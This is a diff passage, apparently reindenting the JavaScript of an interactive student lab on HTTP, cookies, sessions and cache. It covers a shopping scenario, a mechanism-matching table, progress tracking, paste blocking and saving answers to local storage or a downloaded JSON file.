-  '<p><strong>Event 3.</strong> Alice clicks Login. Browser POSTs credentials over HTTPS. Server validates password and replies:<br><code>Set-Cookie: sessionid=XfK9...; HttpOnly; Secure; SameSite=Lax</code></p><br>'+
-  '<p><strong>Event 4.</strong> Alice browses to "My Account". The browser automatically sends <code>Cookie: sessionid=XfK9...</code>. No re-login prompt &#x2014; the server looks up the session and knows who she is.</p><br>'+
-  '<p><strong>Event 5.</strong> She adds a laptop to her cart. The cart API response has <code>Cache-Control: no-store</code>. The cart total updates correctly in real time.</p><br>'+
-  '<p><strong>Event 6.</strong> She returns the next day. The hero banner loads instantly from <strong>disk cache</strong> &#x2014; zero network bytes. Her cart is still correct because sessions are server-side.</p><br>'+
-  '<p><strong>Event 7.</strong> She sees an ad for the exact laptop model she viewed &#x2014; served by <strong>AdX.com</strong>, whose <strong>third-party cookie</strong> is already in her browser from visiting a tech news site.</p><br>'+
-  '<p><strong>Event 8.</strong> She clicks Logout. Server deletes session XfK9... and sends:<br><code>Set-Cookie: sessionid=; Max-Age=0</code> &#x2014; wiping the cookie from her browser.</p>'+
-  '</div>';}
+ '<div class="scene-label"> Alice shops on DevStore.th &#x2014; 8 events, all 5 mechanisms</div>'+
+ '<p><strong>Event 1.</strong> Alice types <strong>https://devstore.th</strong>. The browser performs a <strong>TLS handshake</strong>: the server certificate is verified, a shared secret is negotiated. All traffic is now encrypted. <em>(Port 443)</em></p><br>'+
+ '<p><strong>Event 2.</strong> The server returns the HTML. The hero banner (2 MB image) response includes <code>Cache-Control: max-age=604800</code>. The browser stores it locally.</p><br>'+
+ '<p><strong>Event 3.</strong> Alice clicks Login. Browser POSTs credentials over HTTPS. Server validates password and replies:<br><code>Set-Cookie: sessionid=XfK9...; HttpOnly; Secure; SameSite=Lax</code></p><br>'+
+ '<p><strong>Event 4.</strong> Alice browses to "My Account". The browser automatically sends <code>Cookie: sessionid=XfK9...</code>. No re-login prompt &#x2014; the server looks up the session and knows who she is.</p><br>'+
+ '<p><strong>Event 5.</strong> She adds a laptop to her cart. The cart API response has <code>Cache-Control: no-store</code>. The cart total updates correctly in real time.</p><br>'+
+ '<p><strong>Event 6.</strong> She returns the next day. The hero banner loads instantly from <strong>disk cache</strong> &#x2014; zero network bytes. Her cart is still correct because sessions are server-side.</p><br>'+
+ '<p><strong>Event 7.</strong> She sees an ad for the exact laptop model she viewed &#x2014; served by <strong>AdX.com</strong>, whose <strong>third-party cookie</strong> is already in her browser from visiting a tech news site.</p><br>'+
+ '<p><strong>Event 8.</strong> She clicks Logout. Server deletes session XfK9... and sends:<br><code>Set-Cookie: sessionid=; Max-Age=0</code> &#x2014; wiping the cookie from her browser.</p>'+
+ '</div>';}
 
 function grandTable(){
-  var events=[
-    'Event 1 &#x2014; https:// connection',
-    'Event 2 &#x2014; Hero banner + Cache-Control',
-    'Event 3 &#x2014; Login &#x2192; Set-Cookie',
-    'Event 4 &#x2014; My Account auto-loads',
-    'Event 5 &#x2014; Cart update, no-store',
-    'Event 6 &#x2014; Return visit, banner instant',
-    'Event 7 &#x2014; Targeted laptop ad',
-    'Event 8 &#x2014; Logout',
-  ];
-  var opts='<option value="">&#x2014; select &#x2014;</option>'+
-    '<option>HTTP / HTTPS</option><option>Cookie</option><option>Session</option>'+
-    '<option>Cache</option><option>HTTPS + Session</option><option>Cookie + Session</option>'+
-    '<option>Cache + Session</option><option>Third-party Cookie</option>';
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Event</th><th>Mechanism</th><th>Explain what is happening (1&#x2013;2 sentences)</th></tr></thead><tbody>';
-  events.forEach(function(ev,i){
-    h+='<tr><td class="row-label" style="white-space:normal;min-width:150px">'+ev+'</td>'+
-       '<td style="min-width:160px"><select onchange="onT(\'ga'+i+'m\')" id="ga'+i+'m">'+opts+'</select></td>'+
-       '<td><input type="text" placeholder="Explain\u2026" oninput="onT(\'ga'+i+'e\')" id="ga'+i+'e"></td></tr>';
-  });
-  return h+'</tbody></table></div>';
+ var events=[
+ 'Event 1 &#x2014; https:// connection',
+ 'Event 2 &#x2014; Hero banner + Cache-Control',
+ 'Event 3 &#x2014; Login &#x2192; Set-Cookie',
+ 'Event 4 &#x2014; My Account auto-loads',
+ 'Event 5 &#x2014; Cart update, no-store',
+ 'Event 6 &#x2014; Return visit, banner instant',
+ 'Event 7 &#x2014; Targeted laptop ad',
+ 'Event 8 &#x2014; Logout',
+ ];
+ var opts='<option value="">&#x2014; select &#x2014;</option>'+
+ '<option>HTTP / HTTPS</option><option>Cookie</option><option>Session</option>'+
+ '<option>Cache</option><option>HTTPS + Session</option><option>Cookie + Session</option>'+
+ '<option>Cache + Session</option><option>Third-party Cookie</option>';
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Event</th><th>Mechanism</th><th>Explain what is happening (1&#x2013;2 sentences)</th></tr></thead><tbody>';
+ events.forEach(function(ev,i){
+ h+='<tr><td class="row-label" style="white-space:normal;min-width:150px">'+ev+'</td>'+
+ '<td style="min-width:160px"><select onchange="onT(\'ga'+i+'m\')" id="ga'+i+'m">'+opts+'</select></td>'+
+ '<td><input type="text" placeholder="Explain\u2026" oninput="onT(\'ga'+i+'e\')" id="ga'+i+'e"></td></tr>';
+ });
+ return h+'</tbody></table></div>';
 }
 
 // =========================================================
 // NAVIGATION
 // =========================================================
 function buildNav(){
-  var c=document.getElementById('navItems');c.innerHTML='';
-  EXERCISES.forEach(function(ex,i){
-    var d=document.createElement('div');
-    d.className='nav-item'+(i===0?' active':'');d.id='nav-'+i;
-    d.innerHTML='<span class="nav-dot" id="ndot-'+i+'">'+(i+1)+'</span>'+ex.title;
-    d.onclick=(function(n){return function(){goEx(n);};})(i);
-    c.appendChild(d);
-  });
+ var c=document.getElementById('navItems');c.innerHTML='';
+ EXERCISES.forEach(function(ex,i){
+ var d=document.createElement('div');
+ d.className='nav-item'+(i===0?' active':'');d.id='nav-'+i;
+ d.innerHTML='<span class="nav-dot" id="ndot-'+i+'">'+(i+1)+'</span>'+ex.title;
+ d.onclick=(function(n){return function(){goEx(n);};})(i);
+ c.appendChild(d);
+ });
 }
 function goEx(idx){
-  if(idx<0||idx>=EXERCISES.length) return;
-  EXERCISES.forEach(function(ex,i){
-    document.getElementById('ex-card-'+ex.id).classList.toggle('visible',i===idx);
-    document.getElementById('nav-'+i).classList.toggle('active',i===idx);
-  });
-  currentEx=idx;window.scrollTo(0,0);
+ if(idx<0||idx>=EXERCISES.length) return;
+ EXERCISES.forEach(function(ex,i){
+ document.getElementById('ex-card-'+ex.id).classList.toggle('visible',i===idx);
+ document.getElementById('nav-'+i).classList.toggle('active',i===idx);
+ });
+ currentEx=idx;window.scrollTo(0,0);
 }
 
 // =========================================================
 // PROGRESS
 // =========================================================
 function countQuestions(ex){
-  var n=0;ex.sections.forEach(function(s){if(s.questions) n+=s.questions.length;});return n;
+ var n=0;ex.sections.forEach(function(s){if(s.questions) n+=s.questions.length;});return n;
 }
 function onAnswer(qid){
-  var el=document.getElementById('qa-'+qid);
-  if(el&&el.value.trim()){answers[qid]=el.value;el.classList.add('answered');}
-  else{delete answers[qid];if(el) el.classList.remove('answered');}
-  updateProgress();
+ var el=document.getElementById('qa-'+qid);
+ if(el&&el.value.trim()){answers[qid]=el.value;el.classList.add('answered');}
+ else{delete answers[qid];if(el) el.classList.remove('answered');}
+ updateProgress();
 }
 function onT(fid){
-  var el=document.getElementById(fid);
-  if(el&&el.value.trim()) answers[fid]=el.value;else delete answers[fid];
-  updateProgress();
+ var el=document.getElementById(fid);
+ if(el&&el.value.trim()) answers[fid]=el.value;else delete answers[fid];
+ updateProgress();
 }
 function updateProgress(){
-  var totalQ=0,totalA=0;
-  EXERCISES.forEach(function(ex){
-    var q=0,a=0;
-    ex.sections.forEach(function(s){
-      if(s.questions) s.questions.forEach(function(qu){
-        q++;totalQ++;
-        var el=document.getElementById('qa-'+qu.id);
-        if(el&&el.value.trim()){a++;totalA++;}
-      });
-    });
-    var pct=q>0?Math.round(a/q*100):0;
-    var f=document.getElementById('ep-'+ex.id);if(f) f.style.width=pct+'%';
-    var l=document.getElementById('el-'+ex.id);if(l) l.textContent=a+' / '+q;
-    var nd=document.getElementById('ndot-'+EXERCISES.indexOf(ex));
-    if(nd){if(a>=q&&q>0) nd.classList.add('done');else nd.classList.remove('done');}
-  });
-  var pct=totalQ>0?Math.round(totalA/totalQ*100):0;
-  var f=document.getElementById('progFill');if(f) f.style.width=pct+'%';
-  var l=document.getElementById('progPct');if(l) l.textContent=pct+'%';
+ var totalQ=0,totalA=0;
+ EXERCISES.forEach(function(ex){
+ var q=0,a=0;
+ ex.sections.forEach(function(s){
+ if(s.questions) s.questions.forEach(function(qu){
+ q++;totalQ++;
+ var el=document.getElementById('qa-'+qu.id);
+ if(el&&el.value.trim()){a++;totalA++;}
+ });
+ });
+ var pct=q>0?Math.round(a/q*100):0;
+ var f=document.getElementById('ep-'+ex.id);if(f) f.style.width=pct+'%';
+ var l=document.getElementById('el-'+ex.id);if(l) l.textContent=a+' / '+q;
+ var nd=document.getElementById('ndot-'+EXERCISES.indexOf(ex));
+ if(nd){if(a>=q&&q>0) nd.classList.add('done');else nd.classList.remove('done');}
+ });
+ var pct=totalQ>0?Math.round(totalA/totalQ*100):0;
+ var f=document.getElementById('progFill');if(f) f.style.width=pct+'%';
+ var l=document.getElementById('progPct');if(l) l.textContent=pct+'%';
 }
 
 // =========================================================
 // PASTE DETECTION
 // =========================================================
 function handlePaste(e,qid){
-  e.preventDefault();pasteStrikes++;
-  var el=document.getElementById('qa-'+qid);if(el) el.value='';
-  logIntegrity(' Paste blocked (strike '+pasteStrikes+'/'+MAX_STRIKES+')');
-  var row=document.getElementById('apStrikeRow');row.innerHTML='';
-  for(var i=0;i<MAX_STRIKES;i++){var d=document.createElement('div');d.className='ap-sdot'+(i<pasteStrikes?' hit':'');row.appendChild(d);}
-  document.getElementById('apSubMsg').textContent=pasteStrikes>=MAX_STRIKES?'Maximum strikes reached.':'Strike '+pasteStrikes+' of '+MAX_STRIKES+'.';
-  var chip=document.getElementById('strikeChip');
-  chip.style.display='inline-flex';chip.textContent=' '+pasteStrikes+' paste strike'+(pasteStrikes>1?'s':'');
-  chip.className='strike-chip'+(pasteStrikes>=MAX_STRIKES?' danger':'');
-  document.getElementById('apOverlay').classList.add('show');
+ e.preventDefault();pasteStrikes++;
+ var el=document.getElementById('qa-'+qid);if(el) el.value='';
+ logIntegrity(' Paste blocked (strike '+pasteStrikes+'/'+MAX_STRIKES+')');
+ var row=document.getElementById('apStrikeRow');row.innerHTML='';
+ for(var i=0;i<MAX_STRIKES;i++){var d=document.createElement('div');d.className='ap-sdot'+(i<pasteStrikes?' hit':'');row.appendChild(d);}
+ document.getElementById('apSubMsg').textContent=pasteStrikes>=MAX_STRIKES?'Maximum strikes reached.':'Strike '+pasteStrikes+' of '+MAX_STRIKES+'.';
+ var chip=document.getElementById('strikeChip');
+ chip.style.display='inline-flex';chip.textContent=' '+pasteStrikes+' paste strike'+(pasteStrikes>1?'s':'');
+ chip.className='strike-chip'+(pasteStrikes>=MAX_STRIKES?' danger':'');
+ document.getElementById('apOverlay').classList.add('show');
 }
 function dismissWarning(){document.getElementById('apOverlay').classList.remove('show');}
 function logIntegrity(msg){
-  var log=document.getElementById('ilog'),d=document.createElement('div');
-  d.className='il-e'+(msg.includes('')?' il-w':'');
-  d.textContent=new Date().toLocaleTimeString()+' \u2014 '+msg;
-  log.appendChild(d);log.scrollTop=log.scrollHeight;
+ var log=document.getElementById('ilog'),d=document.createElement('div');
+ d.className='il-e'+(msg.includes('')?' il-w':'');
+ d.textContent=new Date().toLocaleTimeString()+' \u2014 '+msg;
+ log.appendChild(d);log.scrollTop=log.scrollHeight;
 }
 
 // =========================================================
 // SAVE / DOWNLOAD
 // =========================================================
 function collectAll(){
-  var out={
-    student:{name:document.getElementById('f-name').value,id:document.getElementById('f-id').value,
-             class:document.getElementById('f-class').value,date:document.getElementById('f-date').value},
-    lab:'Module 2 \u2014 HTTP, Cookies, Sessions & Cache',
-    submittedAt:new Date().toISOString(),pasteStrikes:pasteStrikes,answers:{}
-  };
-  document.querySelectorAll('textarea').forEach(function(el){if(el.id&&el.value.trim()) out.answers[el.id]=el.value.trim();});
-  document.querySelectorAll('input[type=text]').forEach(function(el){if(el.id&&el.value.trim()) out.answers[el.id]=el.value.trim();});
-  document.querySelectorAll('select').forEach(function(el){if(el.id&&el.value) out.answers[el.id]=el.value;});
-  out.quizResults=quizState;return out;
+ var out={
+ student:{name:document.getElementById('f-name').value,id:document.getElementById('f-id').value,
+ class:document.getElementById('f-class').value,date:document.getElementById('f-date').value},
+ lab:'Module 2 \u2014 HTTP, Cookies, Sessions & Cache',
+ submittedAt:new Date().toISOString(),pasteStrikes:pasteStrikes,answers:{}
+ };
+ document.querySelectorAll('textarea').forEach(function(el){if(el.id&&el.value.trim()) out.answers[el.id]=el.value.trim();});
+ document.querySelectorAll('input[type=text]').forEach(function(el){if(el.id&&el.value.trim()) out.answers[el.id]=el.value.trim();});
+ document.querySelectorAll('select').forEach(function(el){if(el.id&&el.value) out.answers[el.id]=el.value;});
+ out.quizResults=quizState;return out;
 }
 function saveDraft(){
-  try{localStorage.setItem('cn2-lab2-draft',JSON.stringify(collectAll()));}catch(e){}
-  showToast('Draft saved ');logIntegrity('Draft saved.');
+ try{localStorage.setItem('cn2-lab2-draft',JSON.stringify(collectAll()));}catch(e){}
+ showToast('Draft saved ');logIntegrity('Draft saved.');
 }
 function downloadJSON(){
-  var data=collectAll();
-  var name=data.student.name.trim().replace(/\s+/g,'-').toLowerCase()||'student';
-  var id=data.student.id.trim()||'id';
-  var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
-  var a=document.createElement('a');a.href=URL.createObjectURL(blob);
-  a.download='lab2-http-cookies-cache-'+name+'-'+id+'.json';a.click();
+ var data=collectAll();
+ var name=data.student.name.trim().replace(/\s+/g,'-').toLowerCase()||'student';
+ var id=data.student.id.trim()||'id';
+ var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+ var a=document.createElement('a');a.href=URL.createObjectURL(blob);
+ a.download='lab2-http-cookies-cache-'+name+'-'+id+'.json';a.click();
 }
 function finishLab(){
-  var c=document.getElementById('completionCard');c.classList.add('visible');
-  c.scrollIntoView({behavior:'smooth'});logIntegrity('Lab complete! ');
+ var c=document.getElementById('completionCard');c.classList.add('visible');
+ c.scrollIntoView({behavior:'smooth'});logIntegrity('Lab complete! ');
 }
 function showToast(msg){
-  var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
-  setTimeout(function(){t.classList.remove('show');},2200);
+ var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
+ setTimeout(function(){t.classList.remove('show');},2200);
 }
 function restoreDraft(){
-  try{
-    var raw=localStorage.getItem('cn2-lab2-draft');if(!raw) return;
-    var data=JSON.parse(raw);
-    if(data.student){
-      if(data.student.name) document.getElementById('f-name').value=data.student.name;
-      if(data.student.id)   document.getElementById('f-id').value=data.student.id;
-      if(data.student.class)document.getElementById('f-class').value=data.student.class;
-      if(data.student.date) document.getElementById('f-date').value=data.student.date;
-    }
-    if(data.answers) Object.keys(data.answers).forEach(function(k){
-      var el=document.getElementById(k);
-      if(el){el.value=data.answers[k];if(el.tagName==='TEXTAREA') el.classList.add('answered');}
-    });
-    logIntegrity('Draft restored.');showToast('Draft restored ');
-  }catch(e){}
+ try{
+ var raw=localStorage.getItem('cn2-lab2-draft');if(!raw) return;
+ var data=JSON.parse(raw);
+ if(data.student){
+ if(data.student.name) document.getElementById('f-name').value=data.student.name;
+ if(data.student.id) document.getElementById('f-id').value=data.student.id;
+ if(data.student.class)document.getElementById('f-class').value=data.student.class;
+ if(data.student.date) document.getElementById('f-date').value=data.student.date;
+ }
+ if(data.answers) Object.keys(data.answers).forEach(function(k){
+ var el=document.getElementById(k);
+ if(el){el.value=data.answers[k];if(el.tagName==='TEXTAREA') el.classList.add('answered');}
+ });
+ logIntegrity('Draft restored.');showToast('Draft restored ');
+ }catch(e){}
 }
 window.addEventListener('DOMContentLoaded',function(){
-  renderAll();restoreDraft();
-  document.getElementById('f-date').value=new Date().toISOString().split('T')[0];
-  logIntegrity('Lab ready. Good luck!');;
-  setInterval(function(){try{localStorage.setItem('cn2-lab2-draft',JSON.stringify(collectAll()));}catch(e){}},30000);
+ renderAll();restoreDraft();
+ document.getElementById('f-date').value=new Date().toISOString().split('T')[0];
+ logIntegrity('Lab ready. Good luck!');;
+ setInterval(function(){try{localStorage.setItem('cn2-lab2-draft',JSON.stringify(collectAll()));}catch(e){}},30000);
 });
 </script>
 </body>
